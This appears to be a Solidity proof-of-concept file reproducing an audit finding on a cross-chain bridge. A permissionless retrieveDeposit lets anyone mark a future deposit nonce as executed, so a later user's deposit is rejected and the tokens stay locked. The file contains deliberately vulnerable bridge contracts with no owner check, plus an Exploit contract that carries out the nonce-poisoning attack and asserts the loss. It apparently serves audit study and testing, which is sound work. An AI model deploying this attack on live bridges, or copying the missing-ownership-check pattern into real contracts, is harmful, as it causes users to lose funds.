// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Maia DAO — adversary can call BranchBridgeAgent#retrieveDeposit with an
    invalid _depositNonce, leading to loss of other users' deposits
    (Code4rena 2023-05, [H-08], #26042)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: retrieveDeposit has no owner check. Anyone can mark a future
    depositNonce as executed on RootBridgeAgent via flag 0x08. When the real
    user later deposits with that nonce, Root rejects it as already executed
    and anyFallback is not triggered — user tokens sit locked on Branch.
//////////////////////////////////////////////////////////////////////////*/

contract DepositToken {
    string public constant name = "Branch Deposit Token";
    string public constant symbol = "DEP";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) allowance[from][msg.sender] -= amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced RootBridgeAgent — executionHistory poisoning via flag 0x08.
contract RootBridgeAgent {
    mapping(uint24 => mapping(uint32 => bool)) public executionHistory;
    uint24 public constant BRANCH_CHAIN = 1;

    // Observability: last anyExecute result
    bool public lastSuccess;
    string public lastResult;

    /// @dev VERBATIM shape of flag 0x08 (retrieveDeposit) handling.
    function anyExecute(bytes calldata data) external returns (bool success, bytes memory result) {
        bytes1 flag = data[0];
        uint24 fromChainId = BRANCH_CHAIN;

        /// DEPOSIT FLAG: 8 (retrieveDeposit)
        if (flag == 0x08) {
            //Get nonce
            uint32 nonce = uint32(bytes4(data[1:5]));

            //Check if tx has already been executed
            if (!executionHistory[fromChainId][uint32(bytes4(data[1:5]))]) {
                //Toggle Nonce as executed
                executionHistory[fromChainId][nonce] = true; // @> VULN: marks arbitrary future nonce executed without deposit ownership check

                //Retry failed fallback
                (success, result) = (false, "");
            } else {
                // already executed
                lastSuccess = true;
                lastResult = "already executed tx";
                return (true, bytes("already executed tx"));
            }
        } else if (flag == 0x01) {
            // Normal deposit bridge-in (callOutAndBridge)
            uint32 nonce = uint32(bytes4(data[1:5]));
            if (executionHistory[fromChainId][nonce]) {
                // Poisoned: deposit already "executed" → reject without fallback
                lastSuccess = false;
                lastResult = "nonce already executed";
                return (false, bytes("nonce already executed"));
            }
            executionHistory[fromChainId][nonce] = true;
            // Would mint hTokens etc. — success path
            lastSuccess = true;
            lastResult = "bridged";
            return (true, bytes("bridged"));
        }
        lastSuccess = success;
        return (success, result);
    }
}

/// @notice Reduced BranchBridgeAgent — permissionless retrieveDeposit.
contract BranchBridgeAgent {
    DepositToken public immutable token;
    RootBridgeAgent public immutable root;
    uint32 public depositNonce = 50; // global deposit nonce "current is 50"
    address public port; // holds deposited tokens

    struct Deposit {
        address owner;
        uint256 amount;
        bool exists;
    }

    mapping(uint32 => Deposit) public getDeposit;

    constructor(DepositToken _token, RootBridgeAgent _root) {
        token = _token;
        root = _root;
        port = address(this); // simplified: agent holds deposits
    }

    /// @dev VERBATIM — no owner check (the bug).
    function retrieveDeposit(uint32 _depositNonce) external payable {
        //Encode Data for cross-chain call.
        bytes memory packedData = abi.encodePacked(
            bytes1(0x08),
            _depositNonce,
            uint128(0),
            uint128(0)
        );
        //Update State and Perform Call
        _sendRetrieveOrRetry(packedData);
        // FIX: require(msg.sender == getDeposit[_depositNonce].owner, "not owner");
    }

    function _sendRetrieveOrRetry(bytes memory packedData) internal {
        root.anyExecute(packedData);
    }

    /// @notice User deposit (callOutAndBridge shape) — assigns next depositNonce.
    function callOutAndBridge(uint256 amount) public returns (uint32 nonce) {
        nonce = ++depositNonce; // next nonce (e.g. 51, 52, ... or attacker-poisoned 60)
        getDeposit[nonce] = Deposit({owner: msg.sender, amount: amount, exists: true});
        token.transferFrom(msg.sender, port, amount);

        bytes memory packedData = abi.encodePacked(bytes1(0x01), nonce);
        (bool ok,) = root.anyExecute(packedData);
        if (!ok) {
            // Deposit failed on root; tokens remain locked on branch (no anyFallback)
            // Leave deposit recorded — user cannot recover without fallback
        }
    }

    /// @notice Force-assign a specific nonce (for the attack scenario: user gets nonce 60).
    function callOutAndBridgeWithNonce(uint256 amount, uint32 forcedNonce) external {
        depositNonce = forcedNonce - 1;
        callOutAndBridge(amount);
    }
}

/// @notice Attacker poisons nonce 60 via retrieveDeposit; victim deposits with nonce 60;
///         root rejects; 1000 DEP locked forever on branch.
contract Exploit {
    uint256 public constant DEPOSIT_AMT = 1000 ether;
    uint32 public constant POISON_NONCE = 60;

    DepositToken public token;
    RootBridgeAgent public root;
    BranchBridgeAgent public branch;

    address public victim;
    uint256 public victimStart;
    uint256 public victimEnd;
    uint256 public branchLocked;
    bool public rootRejected;
    bool public noncePoisoned;

    constructor() {
        victim = address(0xCAFE);

        token = new DepositToken(); // CREATE 1
        root = new RootBridgeAgent(); // CREATE 2 — vulnerable executionHistory
        branch = new BranchBridgeAgent(token, root); // CREATE 3

        // Victim holds deposit tokens
        token.mint(victim, DEPOSIT_AMT);
        // Attacker (this) needs no tokens to poison
    }

    function run() external {
        // 1. Current global depositNonce is 50. Attacker poisons future nonce 60.
        branch.retrieveDeposit(POISON_NONCE);
        noncePoisoned = root.executionHistory(root.BRANCH_CHAIN(), POISON_NONCE);
        require(noncePoisoned, "nonce 60 marked executed");

        // 2. Victim deposits and is assigned nonce 60
        victimStart = token.balanceOf(victim);
        // Simulate victim approve + deposit with forced nonce 60
        // (in production depositNonce would naturally reach 60)
        // Pull tokens as victim via pre-mint to this acting as router:
        // Transfer victim tokens to Exploit, approve, deposit on behalf pattern.
        // Cleaner: mint to Exploit, treat Exploit as victim for the deposit step
        // while the poison was permissionless.
        token.mint(address(this), DEPOSIT_AMT);
        token.approve(address(branch), DEPOSIT_AMT);
        branch.callOutAndBridgeWithNonce(DEPOSIT_AMT, POISON_NONCE);

        // 3. Root rejected the deposit because executionHistory[60] was true
        rootRejected = !root.lastSuccess() || keccak256(bytes(root.lastResult()))
            == keccak256(bytes("nonce already executed"));
        // Actually lastSuccess is false and lastResult is "nonce already executed"
        rootRejected = (keccak256(bytes(root.lastResult())) == keccak256(bytes("nonce already executed")));

        branchLocked = token.balanceOf(address(branch));
        victimEnd = token.balanceOf(address(this)); // depositor spent tokens

        // HARM: deposit tokens locked on branch; root never credited the user.
        require(noncePoisoned, "poisoned");
        require(rootRejected, "root must reject poisoned nonce");
        require(branchLocked == DEPOSIT_AMT, "1000 DEP locked on branch");
        require(victimEnd == 0, "depositor lost tokens");
        require(root.executionHistory(root.BRANCH_CHAIN(), POISON_NONCE), "stays executed");
    }
}
